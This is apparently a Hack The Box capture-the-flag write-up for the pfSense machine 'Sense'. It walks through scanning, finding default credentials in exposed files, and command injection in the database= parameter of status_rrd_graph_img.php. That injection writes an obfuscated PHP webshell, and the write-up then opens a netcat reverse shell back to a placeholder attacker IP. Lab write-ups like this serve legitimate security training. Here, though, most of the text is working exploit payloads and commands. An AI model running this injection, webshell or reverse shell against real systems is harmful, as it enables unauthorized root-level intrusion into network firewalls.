# HTB Sense

## Attack Path
1. Add host entry
2. Scan target
3. Identify pfSense on 80/443
4. Access web UI by IP, not hostname
5. Find exposed credentials
6. Log into pfSense
7. Intercept `status_rrd_graph_img.php`
8. Abuse `database=` to write a webshell
9. Confirm RCE as `root`
10. Trigger reverse shell
11. Read flags

---

## Enumeration

### Hosts
```bash
echo "10.129.3.230 sense.htb sense" >> /etc/hosts
````

### Nmap

```bash
nmap -sC -sV -Pn sense.htb -p- -oN sense.txt
```

### Results

```text
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
```

### Notes

* `http://sense.htb` redirects to HTTPS
* Browsing with `sense.htb` triggered a pfSense DNS rebind warning
* The application had to be accessed by IP:

```text
https://10.129.3.230
```

---

## Web Enumeration

### Exposed files

```bash
curl -k https://sense.htb/changelog.txt
curl -k https://sense.htb/system-users.txt
```

### Useful finding

```text
username: Rohit
password: company defaults
```

### Credentials

```text
rohit:pfsense
```

---

## Foothold

### Login

* URL: `https://10.129.3.230`
* Username: `rohit`
* Password: `pfsense`

### Vulnerable functionality

After login:

```text
Status -> RRD Graphs
```

Intercept the image request:

```text
/status_rrd_graph_img.php
```

A normal request looked like:

```http
GET /status_rrd_graph_img.php?start=1773754346&end=1773783146&database=wan-traffic.rrd&style=inverse&graph=eight_hour HTTP/1.1
Host: 10.129.3.230
Cookie: PHPSESSID=...
```

### Payload

Replace only the `database=` value with:

```text
database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"%3C%3Fphp+eval%28base64_decode%28%27ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsg%27%29%29%3B%3F%3E">writeup.php
```

Final request line:

```http
GET /status_rrd_graph_img.php?start=1773754346&end=1773783146&database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"%3C%3Fphp+eval%28base64_decode%28%27ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsg%27%29%29%3B%3F%3E">writeup.php HTTP/1.1
```

This writes `writeup.php` into `/usr/local/www/`.

### Confirm RCE

```bash
curl -k 'https://10.129.3.230/writeup.php?cmd=id'
```

### Output

```text
uid=0(root) gid=0(wheel) groups=0(wheel)
```

At this point, command execution as `root` was confirmed.

---

## Shell

### Listener

```bash
nc -lvnp 4444
```

### Reverse shell

```bash
curl -k --get --data-urlencode "cmd=rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f" "https://10.129.3.230/writeup.php"
```

Replace `YOUR_IP` with your tun0 IP.

---

## Flags

```bash
cat /home/rohit/user.txt
cat /root/root.txt
```

---

## Commands Used

```bash
echo "10.129.3.230 sense.htb sense" >> /etc/hosts

nmap -sC -sV -Pn sense.htb -p- -oN sense.txt

curl -k https://sense.htb/changelog.txt
curl -k https://sense.htb/system-users.txt

curl -k 'https://10.129.3.230/writeup.php?cmd=id'

nc -lvnp 4444

curl -k --get --data-urlencode "cmd=rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f" "https://10.129.3.230/writeup.php"

cat /home/rohit/user.txt
cat /root/root.txt
```

```
